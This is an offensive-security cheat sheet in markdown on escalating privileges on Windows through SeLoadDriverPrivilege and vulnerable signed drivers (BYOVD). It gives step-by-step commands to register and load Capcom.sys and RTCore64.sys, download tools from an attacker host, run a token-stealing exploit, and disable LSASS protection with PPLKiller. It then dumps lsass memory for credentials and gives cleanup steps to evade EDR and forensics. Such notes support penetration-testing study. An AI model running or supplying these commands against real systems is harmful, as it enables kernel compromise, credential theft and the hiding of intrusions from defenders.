---
created: 2026-09-02
updated: 2026-09-20
tags:
  - Windows
  - Windows_PrivEsc
status: complete
---

> [!abstract]+ **Scope**: `SeLoadDriverPrivilege`; loading kernel drivers via `NtLoadDriver()`; Kernel-Mode Code Signing (KMCS) constraints; Bring Your Own Vulnerable Driver (BYOVD); Protected Process Light (PPL).

- [ ] Confirm your current user has `SeLoadDriverPrivilege` assigned (either directly or inherited from a group membership) and determine whether it's enabled.
- [ ] If the privilege is present but disabled, enable it in the process that will perform the privileged operation (e.g., using [`EnableAllTokenPrivs.ps1`](https://github.com/fashionproof/EnableAllTokenPrivs/blob/master/EnableAllTokenPrivs.ps1) in PowerShell).
- [ ] Load a legitimately signed but vulnerable kernel driver and exploit its vulnerability to perform privileged kernel operations.
- [ ] Verify privilege escalation.

## `SeLoadDriverPrivilege`

>**`SeLoadDriverPrivilege`** is a Windows user right that allows a process to dynamically load and unload kernel-mode device drivers into kernel memory.

- Kernel drivers (`.sys`) execute in kernel mode (Ring `0`) with unrestricted access to all virtual memory, CPU control registers, and physical hardware.
- Windows loads drivers into kernel space using the native `NtLoadDriver()` system call. This call reads the driver's service configuration from the registry, typically under `HKLM\SYSTEM\CurrentControlSet\Services\<DriverName>`. The `ImagePath` value contains the path to the driver executable, and `Type` specifies the service type (`0x1` for kernel driver).
- A process with an enabled `SeLoadDriverPrivilege` can register the service entry and invoke `NtLoadDriver()` to load drivers without administrative rights.

>[!important] By default, `SeLoadDriverPrivilege` is assigned to the built-in [[Print Operators]] and `Administrators` groups.

- 64-bit Windows versions enforce **Kernel-Mode Code Signing (KMCS)** and **Driver Signature Enforcement (DSE)** that prevent the kernel from loading drivers without a valid digital signature trusted by Windows (Authenticode).
- Because unsigned custom drivers are rejected by DSE, privilege escalation relies on **Bring Your Own Vulnerable Driver (BYOVD)**: loading a legitimately signed third-party driver that contains **known vulnerabilities (such as arbitrary kernel read/write or unrestricted IOCTL dispatch).

> [!note] See [[Windows privileges#SeLoadDriverPrivilege]].

- `SeLoadDriverPrivilege` privilege escalation vectors:
	- **Loading vulnerable drivers (BYOVD)**
		- Registering a driver service entry under a writable registry location and calling `NtLoadDriver()` (e.g., using `EopLoadDriver`) to load a signed vulnerable driver into kernel space. Then exploiting the driver for privilege escalation.

## Enumerating and enabling privileges

- Check if `SeLoadDriverPrivilege` is present in your access token:

```powershell
whoami /priv
```

- Even if the privilege is present in the output but marked `Disabled`, Windows won't consider it during access checks. You need to enable the privilege first before using it.
- In your current PowerShell session, you can use [`EnableAllTokenPrivs.ps1`](https://github.com/fashionproof/EnableAllTokenPrivs/blob/master/EnableAllTokenPrivs.ps1):

```powershell
Import-Module .\EnableAllTokenPrivs.ps1
```
```powershell
.\EnableAllTokenPrivs.ps1
```
```powershell
whoami /priv
```

>[!note] The script calls `AdjustTokenPrivileges()` against your current process token; it can't assign new privileges, only toggle already assigned privileges to an enabled state.

## Registering and loading drivers with `EopLoadDriver`

- To load drivers, you can use **[`EopLoadDriver`](https://github.com/TarlogicSecurity/EoPLoadDriver)**, a tool that wraps the `NtLoadDriver()` API.
- The workflow: **register a driver service key → load the driver using `EopLoadDriver.exe` → exploit the driver vulnerability → unload the driver and clean up**.

1. Register the driver service key under `HKCU` (writable without administrative privileges):

```powershell
reg add HKCU\System\CurrentControlSet\Capcom /v ImagePath /t REG_EXPAND_SZ /d "\??\C:\Windows\Temp\Capcom.sys" /f
```

```powershell
reg add HKCU\System\CurrentControlSet\Capcom /v Type /t REG_DWORD /d 1 /f
```

| Registry value | Type | Description |
| :--- | :--- | :--- |
| `ImagePath` | `REG_EXPAND_SZ` | Full device path to the `.sys` file, prefixed with `\??\` for the NT namespace. |
| `Type` | `REG_DWORD` | Service type set to `1` (`SERVICE_KERNEL_DRIVER`). |

2. Transfer `EopLoadDriver.exe` and the signed vulnerable driver to the target host:

```powershell
Invoke-WebRequest -Uri "http://<attacker_ip_address>:8000/EopLoadDriver.exe" -OutFile "C:\Windows\Temp\EopLoadDriver.exe"
```

```powershell
Invoke-WebRequest -Uri "http://<attacker_ip_address>:8000/Capcom.sys" -OutFile "C:\Windows\Temp\Capcom.sys"
```

3. Load the driver using `EopLoadDriver.exe`:

```powershell
C:\Windows\Temp\EopLoadDriver.exe System\CurrentControlSet\Capcom C:\Windows\Temp\Capcom.sys
```

| Argument | Description |
| :--- | :--- |
| `System\CurrentControlSet\Capcom` | Registry subkey path (relative to `HKCU`) where the driver service configuration is stored. |
| `C:\Windows\Temp\Capcom.sys` | Full path to the driver `.sys` file on disk. |

>[!tip]+
> - Verify the driver has loaded into the kernel ([`driverquery`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/driverquery)):
>
> ```powershell
> driverquery.exe /v | findstr /i "Capcom"
> ```

## Exploiting vulnerable drivers

- BYOVD (Bring Your Own Vulnerable Driver) exploits a legitimately signed driver with a known vulnerability to achieve privileged kernel execution.

- Common BYOVD driver targets include:

| Driver                           | Vulnerability                                                                  | Exploitation impact                                                                       |
| :------------------------------- | :----------------------------------------------------------------------------- | :---------------------------------------------------------------------------------------- |
| `Capcom.sys`                     | Arbitrary kernel function execution with SMEP disabled via IOCTL `0xAA013044`. | Executes shellcode directly in Ring `0` to elevate the calling process token to `SYSTEM`. |
| `RTCore64.sys` (MSI Afterburner) | Arbitrary physical and virtual kernel memory read/write via IOCTL.             | Clears `_PS_PROTECTION` on `lsass.exe`, steals `SYSTEM` tokens, or removes EDR callbacks. |
| `gdrv.sys` (GIGABYTE)            | Arbitrary physical memory read/write via IOCTL.                                | Patches kernel structures and disables Driver Signature Enforcement (DSE).                |
| `DBUtil_2_3.sys` (Dell)          | Arbitrary physical and virtual memory read/write.                              | Overwrites kernel data structures and process access tokens.                              |

### Stealing access tokens with `Capcom.sys`

- `Capcom.sys` provides an IOCTL interface that takes a user-supplied pointer, disables Supervisor Mode Execution Prevention (SMEP), and executes the code in kernel mode (Ring `0`).
- Execute a compiled exploit targeting `Capcom.sys` to steal the `NT AUTHORITY\SYSTEM` token:

```powershell
C:\Windows\Temp\CapcomExploit.exe
```

>[!tip]+
> - Verify the current security context after running the exploit:
>
> ```powershell
> whoami
> ```

### Disabling LSASS protection with `RTCore64.sys`

- On systems that enforce LSA Protection (Protected Process Light / PPL), `lsass.exe` process memory can't be read directly — even with `SeDebugPrivilege`.

>[!note] See [[SeDebugPrivilege]] and [[Dumping LSASS memory]].

- `RTCore64.sys` exposes arbitrary kernel memory read and write primitives that allow you disable LSA Protection by modifying the `_PS_PROTECTION` field of the `lsass.exe` `EPROCESS` structure.

1. Register and load `RTCore64.sys` using `EopLoadDriver.exe`:

```powershell
reg add HKCU\System\CurrentControlSet\RTCore64 /v ImagePath /t REG_EXPAND_SZ /d "\??\C:\Windows\Temp\RTCore64.sys" /f
```

```powershell
reg add HKCU\System\CurrentControlSet\RTCore64 /v Type /t REG_DWORD /d 1 /f
```

```powershell
C:\Windows\Temp\EopLoadDriver.exe System\CurrentControlSet\RTCore64 C:\Windows\Temp\RTCore64.sys
```

2. Clear the PPL protection flags on `lsass.exe` using `PPLKiller.exe`:

```powershell
C:\Windows\Temp\PPLKiller.exe /disablePPL lsass.exe
```

| Option | Description |
| :--- | :--- |
| `/disablePPL` | Clears the `_PS_PROTECTION` level on the specified process name or PID. |

3. Create a memory dump of `lsass.exe` using `comsvcs.dll`:

```powershell
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process -Name lsass).Id C:\Windows\Temp\lsass.dmp full
```

>[!warning] BYOVD drivers are flagged by many EDR products. Load them from a writable working directory and remove the driver file and registry keys when done to reduce forensic artifacts.

>[!tip]+
> - Unload the driver after exploitation:
>
> ```powershell
> C:\Windows\Temp\EopLoadDriver.exe /unload System\CurrentControlSet\RTCore64
> ```
> - Delete the registered service key:
>
> ```powershell
> reg delete HKCU\System\CurrentControlSet\RTCore64 /f
> ```
> - Clean up dropped tool and driver files:
>
> ```powershell
> Remove-Item -Path "C:\Windows\Temp\RTCore64.sys" -Force
> ```
>
> ```powershell
> Remove-Item -Path "C:\Windows\Temp\PPLKiller.exe" -Force
> ```

## References and further reading

- [`Load and unload device drivers — Microsoft Learn`](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/load-and-unload-device-drivers)
- [`Driver Signature Enforcement — Microsoft Learn`](https://learn.microsoft.com/en-us/windows-hardware/drivers/install/kernel-mode-code-signing-policy--windows-vista-and-later-)
- [`EopLoadDriver — GitHub`](https://github.com/TarlogicSecurity/EoPLoadDriver)
- [`Abusing SeLoadDriverPrivilege for privilege escalation — TarlogicSecurity`](https://www.tarlogic.com/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [`Living off the Land Drivers (LOLDrivers)`](https://www.loldrivers.io/)
- [`Exploiting RTCore64.sys — Red Team Notes`](https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/exploiting-rtcore64.sys)
- [`HKLM\SYSTEM\CurrentControlSet\Services Registry Tree — Microsoft Learn`](https://learn.microsoft.com/en-us/windows-hardware/drivers/install/hklm-system-currentcontrolset-services-registry-tree)

